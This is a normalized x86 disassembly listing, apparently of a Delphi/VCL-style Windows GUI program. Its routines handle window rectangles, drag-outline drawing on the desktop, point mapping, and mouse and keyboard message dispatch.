pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_43c414
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_43bb70
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_43bb5c
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402a5c
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402a5c
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_4423cc
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_43c4f8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_43c544
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403420
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403420
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_43c608
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_43c654
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_43c6a0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43c7bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41ccc4
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c7c2
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_43c7f4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_43b710
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033d4
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403420
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403420
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403420
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403420
jmp r-xdata
sub_43c8e4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_4124bc
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_43cdcc
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_43bb5c
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_43bb70
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_41250c
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43cac4
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_43b6e4
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403420
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_4423cc
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4392e0
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43caaf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_4423cc
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_4423cc
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403420
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403224
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43b56c
test esi esi
je r-xdata
sub_43cac4
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403420
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_43d948
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403420
mov eax esi
call sub_43b614
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_43b5d0
mov ecx eax
xor edx edx
xor eax eax
call sub_4124e4
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403420
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_43cb68
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_43cb98
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_43cc04
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_43ccc4
sub_43cc34
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_43cc64
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_43b710
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43cc90
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_43ccc4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_43cd98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43cdcc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_43ce64
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_452980
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_452980
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43b76c
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_45c12c
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403420
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_4528c4
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403420
jmp r-xdata
sub_43cff8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_4086b4
mov edi eax
mov eax [ esi + 0x64 ]
call sub_4086e0
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_43b76c
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_40850c
call sub_40847c
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_40847c
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_43d0a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_43d0d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_43d094
push ebp
call sub_43d0a0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43d120
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_43d1ac
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_43d1e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43cc64
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_452834
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403420
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_452834
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403420
sub_43d268
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43b73c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43be04
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_43d1e4
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_43d2b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43b73c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_43d2d0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43b73c
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43be04
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43d1e4
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403420
sub_43d328
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_43cc04
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43cb98
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43cc04
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_43d3c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43d1e4
pop esi
pop ebx
retn
sub_43d3e9
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43d1e4
pop esi
pop ebx
retn
sub_43d40f
add [ eax ] al
add [ eax ] al
push ebx
push esi
